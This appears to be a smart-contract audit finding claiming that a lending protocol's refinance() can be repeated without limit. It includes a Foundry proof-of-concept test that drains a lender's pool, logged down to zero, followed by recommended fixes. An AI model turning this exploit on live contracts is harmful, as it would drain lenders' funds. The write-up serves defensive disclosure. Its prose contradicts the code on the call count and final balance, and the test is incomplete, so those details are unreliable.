# High Risk Findings

## <a id='H-01'></a>H-01. There is no explicit limit on the number of times refinance() can be called for a given loan.            



## Summary

- There is no explicit limit on the number of times refinance() can be called for a given loan.
- This means that a borrower could potentially call refinance() many times in a row in the same transaction to renew the loan indefinitely.


## Vulnerability Details

POC:

```j
function test_refinance_exploit() public {
        // Configuración inicial

        vm.startPrank(lender1);
        Pool memory p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);

        vm.startPrank(borrower);
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 100 * 10 ** 18,
            collateral: 100 * 10 ** 18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);

        vm.startPrank(borrower);

        Refinance memory r = Refinance({
            loanId: 0,
            poolId: keccak256(
                abi.encode(
                    address(lender1),
                    address(loanToken),
                    address(collateralToken)
                )
            ),
            debt: 100 * 10 ** 18,
            collateral: 100 * 10 ** 18
        });
        Refinance[] memory rs = new Refinance[](1);
        rs[0] = r;

        lender.refinance(rs);

        // Configurar pool de refinanciamiento
        vm.startPrank(lender2);

        Pool memory pool2 = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 10,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 50 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 500,
            outstandingLoans: 0
        });

        lender.setPool(pool2);

        // Ejecutar refinanciamiento múltiples veces
        vm.startPrank(borrower);

        bytes32[] memory poolIds = new bytes32[](1);
        poolIds[0] = keccak256(
            abi.encode(
                address(lender2),
                address(loanToken),
                address(collateralToken)
            )
        );

        (, , , , uint256 poolBalance, , , , ) = lender.pools(poolIds[0]);

        for (uint i = 0; i < 9; i++) {
            if (poolBalance == 0) {
                break;
            }

            uint256 _debt = 100 * 10 ** 18;
            Refinance memory refinance = Refinance({
                loanId: 0,
                poolId: keccak256(
                    abi.encode(
                        address(lender2),
                        address(loanToken),
                        address(collateralToken)
                    )
                ),
                debt: _debt,
                collateral: 100 * 10 ** 18
            });

            Refinance[] memory rs_refinances = new Refinance[](1);
            rs_refinances[0] = refinance;

            lender.refinance(rs_refinances);

            // poolBalance -= _debt; // Actualizar balance debt
        (, , , , uint256 poolBalance, , , , ) = lender.pools(poolIds[0]);

            console.log("POOL_BALANCE", poolBalance);

            console.log(
                "================================================================"
            );
        }


```

```j
Logs:
  POOL_BALANCE 800000000000000000000
  ================================================================
  POOL_BALANCE 700000000000000000000
  ================================================================
  POOL_BALANCE 600000000000000000000
  ================================================================
  POOL_BALANCE 500000000000000000000
  ================================================================
  POOL_BALANCE 400000000000000000000
  ================================================================
  POOL_BALANCE 300000000000000000000
  ================================================================
  POOL_BALANCE 200000000000000000000
  ================================================================
  POOL_BALANCE 100000000000000000000
  ================================================================
  POOL_BALANCE 0
  ================================================================
```


- An initial loan and a refinancing pool with 1000 tokens is set up.
- In a loop, the refinance() function is called 10 times.
- Each call to refinance():
- Emits payment and new loan events.
- Transfers tokens from the old pool to the new pool.
- This causes the pool balance to decrease with each iteration.
- The remaining balance is printed after each refinance.
- At the end of the loop, the balance reaches 100 tokens.

This demonstrates two problems:

- There is no limit to the number of refinancings.
- There is no validation that the pool has sufficient funds.
- An attacker could consume all the funds in the pool by making successive rollovers.
- And the pool owner would have no way to stop this.

## Impact

- The impact would be to allow loans to be extended for extended periods, avoid interest payments and potentially cause losses to the lender if they use rapidly depreciating collateral.

The Repaid and Borrowed event is emitted at each iteration. This makes it look like a loan is being repaid and borrowed each time.
But in reality it is the same loan over and over again. Only the terms are changing, such as the interest rate or the lender.
Renewing the loan restarts the time of termination. So it is never terminated and is extended indefinitely.


## Tools Used

Manual review

## Recommendations

- Set a ceiling on the number of refinancings per loan.
- Validate that the pool has funds before each refinancing.
- Allow the pool owner to pause refinancings if abuse occurs.
- To mitigate this, a limit should be added to the number of times refinance() can be called for a given loan, for example by adding a counter in the struct Loan.